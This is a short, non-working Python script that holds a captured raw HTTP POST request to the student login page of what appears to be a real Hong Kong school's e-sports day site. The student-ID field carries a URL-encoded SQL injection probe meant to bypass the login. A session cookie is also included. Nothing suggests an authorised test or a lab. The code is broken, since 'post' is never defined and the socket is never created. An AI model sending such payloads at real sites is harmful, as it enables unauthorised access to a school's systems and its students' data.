import socket

url ="https://aos.ssc.edu.hk/"
s = socket.socket

#requests.post(url, data={key: value}, json={key: value}, args)

raw = """
POST /aos/e-sportsday/student/index.php HTTP/2
Host: aos.ssc.edu.hk
Cookie: PHPSESSID=6huf4uqcbe1evqg3bopeqt74jb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: https://aos.ssc.edu.hk
Dnt: 1
Sec-Gpc: 1
Referer: https://aos.ssc.edu.hk/aos/e-sportsday/student/index.php?root_folder=e-sportsday
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

input_unique_id=a%27%3B+--+&input_pass=a&btn_login=Submit
"""
post(url, data=raw)